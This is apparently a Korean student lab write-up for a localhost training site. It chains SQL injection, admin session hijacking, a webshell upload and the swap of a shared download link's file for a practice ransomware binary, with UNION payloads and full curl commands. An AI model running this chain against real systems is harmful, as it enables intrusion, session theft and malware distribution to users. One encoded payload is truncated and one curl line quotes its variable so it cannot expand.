# Ganda-It SQLi 과정

> SQL Injection 취약점을 시작으로 관리자 세션 확보, 관리자 페이지 접근, 파일 업로드 기능 확인, 웹쉘 동작 확인 및 공유 링크와 파일 간 연결 변경 과정을 수행한 내용입니다.

## 도구 및 환경 정보

- 도구: Burp Suite, curl
- 환경: Localhost 기반 교육용 실습 환경

---

# 1. Burp Suite 수행 방법

## 1.1 취약한 기능 확인 및 공격 표면 확보

Spidering 및 수동 탐색을 통해 SQL Injection이 가능한 기능을 확인합니다.

취약한 URL:

```text
http://localhost/guest.php?token=XXXXX
```

### 실습 화면

![취약한 기능 확인](null)

---

## 1.2 SQL Injection을 통한 users 정보 확인

취약한 `token` 파라미터를 대상으로 SQL Injection을 수행합니다.

### 원본 Payload

```sql
x' UNION SELECT id,username,role FROM users -- -
```

### URL Encode

원활한 요청 전송을 위해 Payload를 URL Encode 합니다.

```text
%78%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%69%64%2c%75%73%65%72%6e%61%6d%65%2c%72%6f%6c%65%20%46%52%4f%4d%20%75%73%65%72%73%20%2d%2d%20%2d
```

### 실습 화면

![users 테이블 조회](null)

---

## 1.3 SQL Injection을 통한 sessions 정보 확인

이번에는 `sessions` 정보를 조회합니다.

### 원본 Payload

```sql
x' UNION SELECT 0,session_id,user_id FROM sessions -- -
```

### URL Encode

```text
%78%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%30%2c%73%65%73%73%69%6f%6e%5f%69%64%2c%75%73%65%72%5f%69%64%20%46%52%4f%4d%20%73%65%73%73%69%6f%6e%73%20%2d%
```

### 확보한 Admin Session

```text
8c3f6a1d9e42b750c4d2816fa037be95
```

### 실습 화면

![sessions 테이블 조회](null)

---

## 1.4 Admin Session을 이용한 관리자 페이지 접근

확보한 Admin Session을 Cookie에 추가합니다.

```http
Cookie: mft_session=8c3f6a1d9e42b750c4d2816fa037be95
```

이후 다음 경로에 접근합니다.

```text
GET /admin
```

관리자 페이지 접근 성공을 확인합니다.

### 실습 화면

![관리자 페이지 접근](null)

---

## 1.5 웹쉘 업로드

관리자 페이지의 업로드 기능에 접근합니다.

```text
/admin/upload.php
```

`human2.php` 파일을 업로드합니다.

### 실습 화면

![웹쉘 업로드 페이지](null)

![human2.php 파일 선택](null)

---

## 1.6 웹쉘 동작 확인

업로드된 웹쉘에 접근합니다.

> 원문에 `/upload/human2.php`로 작성된 부분은 실제 경로인 `/uploads/human2.php`로 수정했습니다.

```text
GET /uploads/human2.php?action=XXXXX
```

웹쉘 요청 시 다음 Header가 존재하지 않으면 정상적으로 동작하지 않는 것을 확인합니다.

```http
X-MFT-Key: execute
```

### 실습 화면

![웹쉘 접근](null)

![X-MFT-Key 확인](null)

---

## 1.7 웹쉘의 files 기능을 이용한 파일 정보 확인

웹쉘의 `files` 기능을 이용해 서버에 존재하는 파일과 공유 링크 정보를 확인합니다.

### 요청 경로

```text
GET /uploads/human2.php?action=files
```

### 확인한 패치 파일

파일 이름:

```text
installer.exe
```

공유 링크 Token:

```text
4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934
```

### 실습 화면

![files 조회](null)

---

## 1.8 파일 업로드

Admin 계정에서 실습용 랜섬웨어 파일을 업로드합니다.

파일 업로드 권한이 존재한다면 반드시 Admin 계정일 필요는 없습니다.

또한 실습 환경에서는 `human2.php` 웹쉘을 이용할 경우 계정 로그인 없이도 파일 업로드가 가능한 것을 확인했습니다.

### 실습 화면

![파일 업로드](null)

![업로드 결과](null)

---

## 1.9 replace_share 기능을 통한 공유 링크 연결 변경

웹쉘의 `replace_share` 기능을 이용하여 기존 공유 링크와 연결된 파일을 변경합니다.

### 요청 경로

```text
GET /uploads/human2.php?action=replace_share&token=4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934&file_id=5
```

기존 파일:

```text
file_id: 4
```

변경된 파일:

```text
file_id: 5
```

기존 파일과 공유 링크의 연결이 끊어지고 새로운 파일이 해당 공유 링크와 연결된 것을 확인합니다.

### 실습 화면

![replace_share 실행](null)

---

## 1.10 shares 기능을 이용한 변경 결과 확인

웹쉘의 `shares` 조회 기능을 이용하여 공유 링크와 파일 간 연결 상태를 확인합니다.

```text
GET /uploads/human2.php?action=shares
```

### 실습 화면

![shares 조회](null)

---

## 1.11 최종 결과 확인

기존 공유 링크를 다시 요청하여 원본 배포 파일이 변경된 파일로 대체된 것을 확인합니다.

### 확인 경로

```text
GET /guest.php?token=4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934
```

### 실습 화면

![최종 공유 링크 확인](null)

---

# 2. curl 명령어로 수행하는 방법

Burp Suite에서 수행한 과정을 `curl` 명령어를 이용해 동일하게 진행할 수 있습니다.

## 2.1 환경 변수 설정

```bash
BASE="http://localhost"
KEY="execute"

WEB_SHELL_DIR="C:\Users\cyw50\OneDrive\바탕 화면\ganda-it-webshell\human2.php"
RANSOMWARE_DIR="C:\Users\cyw50\OneDrive\바탕 화면\ganda-it-webshell\installerhack.exe"
```

---

## 2.2 users 정보 조회

```bash
curl -G "$BASE/guest.php" \
  --data-urlencode "token=x' UNION SELECT id,username,role FROM users -- -"
```

---

## 2.3 sessions 정보 조회

```bash
curl -G "$BASE/guest.php" \
  --data-urlencode "token=x' UNION SELECT 0,session_id,user_id FROM sessions -- -"
```

---

## 2.4 Admin Session 설정

```bash
ADMIN_SESSION="8c3f6a1d9e42b750c4d2816fa037be95"
```

---

## 2.5 관리자 페이지 접근

```bash
curl -i \
  -H 'Cookie: mft_session=$ADMIN_SESSION' \
  "$BASE/admin/"
```

---

## 2.6 웹쉘 업로드

```bash
curl -b "mft_session=$ADMIN_SESSION" \
  -F "package=@$WEB_SHELL_DIR;filename=human2.php" \
  $BASE/admin/upload.php
```

---

## 2.7 users 조회

```bash
curl -H "X-MFT-Key: $KEY" \
  "$BASE/uploads/human2.php?action=users"
```

---

## 2.8 shares 조회

```bash
curl -H "X-MFT-Key: $KEY" \
  "$BASE/uploads/human2.php?action=shares"
```

---

## 2.9 files 조회

```bash
curl -H "X-MFT-Key: $KEY" \
  "$BASE/uploads/human2.php?action=files"
```

---

## 2.10 공유 링크 Token 설정

```bash
TOKEN="4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934"
```

---

## 2.11 파일 업로드

```bash
curl -H "X-MFT-Key: $KEY" \
  -F "file=@$RANSOMWARE_DIR" \
  "$BASE/uploads/human2.php?action=upload"
```

업로드 이후 파일 목록을 다시 확인합니다.

```bash
curl -H "X-MFT-Key: $KEY" \
  "$BASE/uploads/human2.php?action=files"
```

---

## 2.12 업로드된 파일 ID 설정

```bash
MALWARE_FILE_ID="5"
```

---

## 2.13 공유 링크와 파일 연결 변경

```bash
curl -H "X-MFT-Key: $KEY" \
  "$BASE/uploads/human2.php?action=replace_share&token=$TOKEN&file_id=$MALWARE_FILE_ID"
```

---

## 2.14 변경 결과 확인

### shares 조회

```bash
curl -H "X-MFT-Key: $KEY" \
  "$BASE/uploads/human2.php?action=shares"
```

### files 조회

```bash
curl -H "X-MFT-Key: $KEY" \
  "$BASE/uploads/human2.php?action=files"
```

### 실습 화면

![curl 실습 결과](null)

---

# 3. 전체 실습 흐름

```text
취약한 기능 탐색
        ↓
SQL Injection
        ↓
users 정보 조회
        ↓
sessions 정보 조회
        ↓
Admin Session 확보
        ↓
관리자 페이지 접근
        ↓
human2.php 업로드
        ↓
/uploads/human2.php 접근
        ↓
files / shares 정보 조회
        ↓
파일 업로드
        ↓
replace_share 실행
        ↓
공유 링크와 파일 연결 변경
        ↓
Guest 공유 링크에서 최종 결과 확인
```

---

# 4. 실습에서 확인한 주요 항목

| 항목 | 내용 |
|---|---|
| 취약점 | SQL Injection |
| 취약 파라미터 | `token` |
| 주요 페이지 | `/guest.php` |
| 관리자 경로 | `/admin/` |
| 관리자 업로드 페이지 | `/admin/upload.php` |
| 웹쉘 경로 | `/uploads/human2.php` |
| 웹쉘 인증 Header | `X-MFT-Key: execute` |
| 주요 웹쉘 기능 | `users`, `shares`, `files`, `upload`, `replace_share` |
| 공유 링크 식별 값 | `token` |
| 파일 식별 값 | `file_id` |

---

# 5. 정리

SQL Injection 취약점을 이용하여 데이터베이스 내부 정보를 확인하고, 세션 정보를 통해 관리자 권한 영역에 접근하는 과정을 진행했습니다.

이후 관리자 파일 업로드 기능을 통해 웹쉘을 업로드하고, 웹쉘의 `files`, `shares`, `upload`, `replace_share` 기능을 이용해 파일과 공유 링크 사이의 연결 구조를 확인했습니다.

최종적으로 기존 공유 링크와 연결된 파일을 다른 파일로 변경한 뒤 동일한 Guest 공유 링크에서 변경 결과를 확인했습니다.

> 본 내용은 프로젝트 실습 환경에서 수행한 결과를 정리한 문서입니다.
